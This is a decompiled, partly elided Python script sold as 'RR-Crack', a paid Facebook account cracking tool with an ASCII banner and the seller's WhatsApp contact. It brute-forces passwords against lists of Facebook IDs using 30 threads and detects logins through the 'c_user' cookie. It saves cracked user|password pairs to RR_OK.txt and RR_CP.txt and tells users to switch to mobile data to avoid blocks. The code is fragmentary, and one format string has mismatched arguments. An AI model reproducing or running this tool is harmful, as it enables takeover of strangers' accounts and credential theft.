...
# Time Succes decompile : 2022-05-09 02:50:18.885801
import os
try:
    import requests
except ImportError:
...
|____| |___|_____| |______|____| |____|______.'  
                                   \033[1;91m version: 2.3.6
\n\033[0m\033[1;91m────────────────────────────────────────
\033[1;92mCREATE BY \033[1;96m: RR Hacker Riyad
\033[1;92m MODIFY BY \033[1;96m: ABUBOCKOR Riyad
\033[1;92mWhatsApp \033[1;96m: 01710375092
\033[1;92mStatus \033[1;96m: PAID [400Taka] 
\033[0m\033[1;91m─────────────────────────────────────────
""" 
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mRR_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mRR_CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;97mPress enter to back RR Menu ")
	    sarfraz()
...
def sarfraz():
    ...
    IP = ipm['origin']
    print
    print('\x1b[1;96m[1]Start Crack From Random FB ID (2004)')
...
class __xxx__:
    ...
    def sarfrazx(self,id):
        os.system("clear")
        print(logo)
        self.cnt = input('\x1b[1;96mPut File Name : ')
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;97m[RR-Crack] {loop}/{len(self.id)} [ok][{len(ok)}] ~ [cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [RR-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('RR_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [RR-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('RR_CP.txt' , 'a').write('%s\n' % wrt)
                        break
    ...
    def __pler__(self):
        print('\033[0m[1].\x1b[1;93mCrack With Auto Pass ')
        print('\033[0m[2].\x1b[1;93mCrack With Name Digit Pass')
        chi = input('\033[1;96m[?] Choose: ')
        if chi == '':
            print('\nSelect Correct One')
            self.__pler__()
        elif chi in ('1', '01'):
            os.system("clear")
            print(logo)
            print("\033[1;31m\rUse Mobile Data before use\033[1;37m")
            print(47*"-")
            print('\033[1;92m Total Auto file IDs : %s ' % len(self.id))
            ...
            print("\033[1;31m\rUse Mobile Data before use\033[1;37m")
            print(47*"-")
            print('\033[1;92m Total IDs : %s ' % len(self.id))
            print('\033[1;92m Cracking Started...')
            print(47*"-")
            with sarfrazssb(max_workers=30) as ssbworld:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
